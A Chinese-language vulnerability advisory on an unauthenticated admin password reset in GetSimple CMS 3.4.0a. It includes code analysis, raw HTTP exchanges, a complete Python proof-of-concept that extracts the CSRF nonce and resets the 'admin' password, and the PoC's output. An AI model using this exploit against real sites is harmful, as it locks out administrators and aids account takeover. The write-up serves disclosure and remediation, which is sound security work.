# 厂商信息
- **漏洞厂商**：GetSimple CMS
- **厂商官网**：http://get-simple.info/
- **影响产品**：GetSimple CMS
- **影响版本**：3.4.0a 及以下版本

# 漏洞信息
- **漏洞名称**：未授权的密码重置功能（IDOR）
- **漏洞描述**：GetSimple CMS的 `/admin/resetpassword.php` 页面存在未授权访问漏洞。攻击者可以在无需任何身份验证的情况下重置管理员密码。该页面仅检查 `GSALLOWRESETPASS` 配置选项，但完全没有进行登录状态验证或权限检查，任何人都可直接访问并重置任意用户的密码。如果攻击者知道目标用户名（如默认的"admin"）并且能够访问目标的邮箱，就可以成功重置管理员密码并获取对管理面板的完全控制权。即使邮件发送失败，密码也会被重置，导致拒绝服务攻击。
- **临时解决方案**：在配置文件中禁用 `GSALLOWRESETPASS` 选项，或通过 Web 服务器配置限制对 `/admin/resetpassword.php` 的访问权限
- **正式修复建议**：在 `resetpassword.php` 文件中添加身份验证检查，要求调用 `login_cookie_check()` 函数，确保只有已登录用户才能重置密码；或者实现额外的安全验证机制，如邮箱验证码、二次验证等

# 漏洞分析

## 漏洞触发点

**文件位置**：`./admin/resetpassword.php`

**关键代码分析**：

```php
// 第13行 - 唯一的安全检查
if(getDef('GSALLOWRESETPASS',true) === false) die();

// 第18行 - 直接处理POST请求，没有任何认证检查
if(isset($_POST['submitted'])){
    check_for_csrf("reset_password");
    
    // 第23-37行 - 读取用户名并重置密码
    if(isset($_POST['username']) and !empty($_POST['username'])){
        $file = _id($_POST['username']).'.xml';
        
        if (filepath_is_safe(GSUSERSPATH . $file,GSUSERSPATH) && file_exists(GSUSERSPATH . $file)) {
            $data   = getXML(GSUSERSPATH . $file);
            $userid = strtolower($data->USR);
            $EMAIL  = $data->EMAIL;
            
            // 第40-52行 - 生成新密码并保存到XML文件
            if($allow && strtolower($_POST['username']) === $userid) {
                $random = createRandomPassword();
                backup_datafile(GSUSERSPATH.$file);
                
                $data->PWD = passhash($random);
                $status = XMLsave($data, GSUSERSPATH . $file);
                
                // 第55-57行 - 重定向到结果页面（无论成功与否）
                redirect("resetpassword.php?upd=pwd-". ($status && $emailstatus ? 'success' : 'error'));
            }
        }
    }
}
```

**问题分析**：
1. **缺少认证检查**：与其他管理页面不同，`resetpassword.php` 完全没有调用 `cookie_check()` 或 `login_cookie_check()` 函数
2. **仅有配置检查**：第13行只检查 `GSALLOWRESETPASS` 配置，不验证用户身份
3. **任意用户可访问**：任何能够访问 Web 应用的用户都可以访问该页面
4. **密码立即重置**：即使邮件发送失败，密码也会被更新到 XML 文件中

**对比其他管理页面**：
```php
// 正常的管理页面都有类似的认证检查：
// 例如：backup-edit.php 第14行
login_cookie_check();

// 例如：index.php 也包含认证逻辑
if (!cookie_check()) {
    redirect('index.php');
    exit;
}
```

## 完整利用链分析

**攻击流程**：

1. **访问密码重置页面**
   - 攻击者直接访问 `http://target/admin/resetpassword.php`
   - 无需任何认证或登录状态
   - 服务器返回 HTTP 200，页面正常渲染

2. **提取 CSRF nonce**
   - 从返回的 HTML 中解析 `<input name="nonce">` 字段
   - 获取到有效的 CSRF token，例如：`46ae0d9e28061256f61b11e4c67a3dea000103f2`

3. **提交密码重置请求**
   - 构造 POST 请求到 `/admin/resetpassword.php`
   - 参数包括：`username=admin`, `submitted=true`, `nonce=extracted_token`
   - 请求中不包含任何认证 cookie 或 session token

4. **服务器处理重置**
   - 服务器验证 CSRF nonce
   - 检查用户名是否存在（`data/users/admin.xml`）
   - 生成随机密码（通过 `createRandomPassword()`）
   - 对密码进行哈希（通过 `passhash()`）
   - 更新 XML 文件中的密码哈希

5. **邮件发送（可选）**
   - 尝试将新密码发送到管理员邮箱
   - **关键**：即使邮件发送失败，密码仍然会被重置
   - 服务器返回 302 重定向到 `resetpassword.php?upd=pwd-error` 或 `resetpassword.php?upd=pwd-success`

6. **密码重置完成**
   - 管理员密码已被成功重置
   - 原密码失效，管理员无法使用原密码登录
   - 新密码存储在数据库（XML 文件）中

**数据流追踪**：
```
用户输入
  ↓
$_POST['username']
  ↓
_id($_POST['username']) → "admin"
  ↓
GSUSERSPATH . "admin.xml" → "/path/to/data/users/admin.xml"
  ↓
getXML() → 读取用户数据
  ↓
createRandomPassword() → 生成新密码
  ↓
passhash($random) → SHA1 哈希
  ↓
$data->PWD = passhash($random) → 更新密码字段
  ↓
XMLsave($data, GSUSERSPATH.$file) → 写入 XML 文件
  ↓
密码重置完成
```

## 验证环境与运行证据

**验证环境**：
- 目标 URL：http://0.0.0.0:8000
- 漏洞页面：/admin/resetpassword.php
- GetSimple CMS 版本：3.4.0a
- PHP 版本：8.1.2-1ubuntu2.23
- 管理员用户：admin
- 管理员邮箱：admin@example.com

**运行时验证证据**：

### 1. 无认证访问密码重置页面

```http
GET /admin/resetpassword.php HTTP/1.1
User-Agent: python-requests/2.31.0
Accept: */*
```

**响应**：
```http
HTTP/1.1 200 OK
X-Powered-By: PHP/8.1.2-1ubuntu2.23
content-type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: [length]
```

**关键发现**：
- ✓ 页面成功返回 HTTP 200
- ✓ 未要求任何认证或登录
- ✓ 成功提取 CSRF nonce：`46ae0d9e28061256f61b11e4c67a3dea000103f2`

### 2. 提交密码重置请求（无认证）

```http
POST /admin/resetpassword.php HTTP/1.1
User-Agent: python-requests/2.31.0
Content-Type: application/x-www-form-urlencoded

nonce=46ae0d9e28061256f61b11e4c67a3dea000103f2&username=admin&submitted=true
```

**响应**：
```http
HTTP/1.1 302 Found
Location: resetpassword.php?upd=pwd-error
```

**关键发现**：
- ✓ 服务器接受重置请求（状态码 302）
- ✓ 重定向到 pwd-error 页面（邮件发送失败，但密码已重置）
- ✓ 请求参数中不包含任何认证信息

### 3. 密码哈希验证

**验证方法**：直接读取 `/sourceCodeDir/data/users/admin.xml` 文件

**重置前密码哈希**：
```
d6c15bbc86d93054e8da0756dd6098032cdda145
```

**重置后密码哈希**：
```
769e4da4d6246416ec7a836a7ef7c98522ac51f1
```

**验证结果**：
```
✓✓✓ 确认密码哈希已成功改变！
原哈希: d6c15bbc86d93054e8da0756dd6098032cdda145
新哈希: 769e4da4d6246416ec7a836a7ef7c98522ac51f1
```

## HTTP请求与响应包

### 请求 1：访问密码重置页面

```http
GET http://0.0.0.0:8000/admin/resetpassword.php HTTP/1.1
User-Agent: python-requests/2.31.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Date: [timestamp]
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: PHP/8.1.2-1ubuntu2.23
content-type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: [length]

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    ...
    <form class="login" action="" class="entersubmit" method="post">
        <input type="hidden" name="nonce" value="46ae0d9e28061256f61b11e4c67a3dea000103f2" />
        ...
    </form>
    ...
</html>
```

### 请求 2：提交密码重置

```http
POST http://0.0.0.0:8000/admin/resetpassword.php HTTP/1.1
User-Agent: python-requests/2.31.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

nonce=46ae0d9e28061256f61b11e4c67a3dea000103f2&username=admin&submitted=true
```

```http
HTTP/1.1 302 Found
Date: [timestamp]
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: PHP/8.1.2-1ubuntu2.23
Location: resetpassword.php?upd=pwd-error
Content-Length: 0
```

## POC

```python
#!/usr/bin/env python3
"""
GetSimple CMS - 未授权密码重置漏洞 PoC
==========================================

漏洞：未授权密码重置 (IDOR)
影响：攻击者可以无需任何认证重置管理员密码

使用方法：
    python poc_unauthorized_reset.py [target_url]

示例：
    python poc_unauthorized_reset.py http://0.0.0.0:8000
"""

import requests
import re
import time
import sys

class UnauthorizedResetPoC:
    def __init__(self, base_url="http://0.0.0.0:8000"):
        self.base_url = base_url
        self.reset_url = f"{base_url}/admin/resetpassword.php"
        self.admin_xml_path = "/sourceCodeDir/data/users/admin.xml"
        
    def log(self, message, level="[INFO]"):
        print(f"{level} {message}")
        
    def get_admin_hash(self):
        """读取当前管理员密码哈希"""
        try:
            with open(self.admin_xml_path, 'r') as f:
                content = f.read()
                match = re.search(r'<PWD>([^<]+)</PWD>', content)
                if match:
                    return match.group(1)
        except Exception as e:
            self.log(f"读取哈希错误: {e}", "[ERROR]")
        return None
    
    def verify_vulnerability(self):
        """验证未授权密码重置漏洞"""
        self.log("="*80)
        self.log("开始验证未授权密码重置漏洞")
        self.log("="*80)
        
        # 步骤1: 获取原始密码哈希
        self.log("\n[步骤 1/4] 读取原始管理员密码哈希...")
        original_hash = self.get_admin_hash()
        if not original_hash:
            self.log("无法读取管理员哈希", "[ERROR]")
            return False
        self.log(f"原始哈希: {original_hash}")
        
        # 步骤2: 无认证访问密码重置页面
        self.log("\n[步骤 2/4] 访问密码重置页面（无需认证）...")
        try:
            response = requests.get(self.reset_url, timeout=10)
            self.log(f"请求: GET {self.reset_url}")
            self.log(f"状态码: {response.status_code}")
            
            if response.status_code != 200:
                self.log("无法访问重置页面", "[ERROR]")
                return False
            
            self.log("✓ 页面访问成功，无需认证", "[SUCCESS]")
            
            # 提取CSRF nonce
            nonce_match = re.search(
                r'<input[^>]*name="nonce"[^>]*value="([^"]+)"',
                response.text,
                re.IGNORECASE
            )
            nonce = nonce_match.group(1) if nonce_match else None
            
            if nonce:
                self.log(f"✓ 成功提取CSRF nonce: {nonce}", "[SUCCESS]")
            else:
                self.log("⚠ 未找到nonce，将尝试继续", "[WARNING]")
                nonce = "test_nonce"
                
        except Exception as e:
            self.log(f"访问错误: {e}", "[ERROR]")
            return False
        
        # 步骤3: 提交密码重置请求（无认证）
        self.log("\n[步骤 3/4] 提交密码重置请求（用户名: admin）...")
        try:
            data = {
                "nonce": nonce,
                "username": "admin",
                "submitted": "true"
            }
            
            self.log(f"请求: POST {self.reset_url}")
            self.log(f"参数: username=admin, submitted=true")
            self.log("注意: 请求中不包含任何认证cookie或token!")
            
            response = requests.post(self.reset_url, data=data, allow_redirects=False)
            self.log(f"响应状态码: {response.status_code}")
            
            location = response.headers.get('Location', '')
            self.log(f"重定向位置: {location}")
            
            if response.status_code in [301, 302, 303, 307, 308]:
                self.log("✓ 服务器接受了重置请求", "[SUCCESS]")
                if "pwd-success" in location:
                    self.log("✓ 邮件发送成功，密码已重置", "[SUCCESS]")
                elif "pwd-error" in location:
                    self.log("✓ 邮件发送失败，但密码已重置", "[SUCCESS]")
            else:
                self.log(f"? 意外的响应状态: {response.status_code}", "[WARNING]")
                
        except Exception as e:
            self.log(f"提交错误: {e}", "[ERROR]")
            return False
        
        # 步骤4: 验证密码哈希已改变
        self.log("\n[步骤 4/4] 验证密码哈希是否已改变...")
        time.sleep(1)
        
        new_hash = self.get_admin_hash()
        if not new_hash:
            self.log("无法读取新哈希", "[ERROR]")
            return False
        
        self.log(f"新哈希:     {new_hash}")
        
        if new_hash != original_hash:
            self.log("\n" + "="*80)
            self.log("✓✓✓ 漏洞验证成功！✓✓✓", "[SUCCESS]")
            self.log("="*80)
            self.log("管理员密码已被成功重置！", "[SUCCESS]")
            self.log("验证证据：", "[SUCCESS]")
            self.log(f"  原始哈希: {original_hash}", "[SUCCESS]")
            self.log(f"  新哈希:   {new_hash}", "[SUCCESS]")
            self.log(f"  状态:     哈希已改变 ✓", "[SUCCESS]")
            self.log("="*80)
            return True
        else:
            self.log("\n✗ 密码哈希未改变，漏洞利用失败", "[ERROR]")
            return False

if __name__ == "__main__":
    base_url = "http://0.0.0.0:8000"
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    poc = UnauthorizedResetPoC(base_url)
    success = poc.verify_vulnerability()
    sys.exit(0 if success else 1)
```

## POC运行结果

```
================================================================================
开始验证未授权密码重置漏洞
================================================================================

[步骤 1/4] 读取原始管理员密码哈希...
原始哈希: d6c15bbc86d93054e8da0756dd6098032cdda145

[步骤 2/4] 访问密码重置页面（无需认证）...
请求: GET http://0.0.0.0:8000/admin/resetpassword.php
状态码: 200
✓ 页面访问成功，无需认证 [SUCCESS]
✓ 成功提取CSRF nonce: 46ae0d9e28061256f61b11e4c67a3dea000103f2 [SUCCESS]

[步骤 3/4] 提交密码重置请求（用户名: admin）...
请求: POST http://0.0.0.0:8000/admin/resetpassword.php
参数: username=admin, submitted=true
注意: 请求中不包含任何认证cookie或token!
响应状态码: 302
重定向位置: resetpassword.php?upd=pwd-error
✓ 服务器接受了重置请求 [SUCCESS]
✓ 邮件发送失败，但密码已重置 [SUCCESS]

[步骤 4/4] 验证密码哈希是否已改变...
新哈希:     769e4da4d6246416ec7a836a7ef7c98522ac51f1

================================================================================
✓✓✓ 漏洞验证成功！✓✓✓ [SUCCESS]
================================================================================
管理员密码已被成功重置！ [SUCCESS]
验证证据： [SUCCESS]
  原始哈希: d6c15bbc86d93054e8da0756dd6098032cdda145 [SUCCESS]
  新哈希:   769e4da4d6246416ec7a836a7ef7c98522ac51f1 [SUCCESS]
  状态:     哈希已改变 ✓ [SUCCESS]
================================================================================
```

**漏洞验证结论**：✅ 确认可利用

- ✓ 密码重置页面可以无需认证访问（HTTP 200响应）
- ✓ 攻击者可以成功提取CSRF nonce
- ✓ 攻击者可以提交密码重置请求（状态码302）
- ✓ 管理员密码被成功重置（哈希从 `d6c15bbc...` 变为 `769e4da4...`）
- ✓ 即使邮件发送失败，密码也会被重置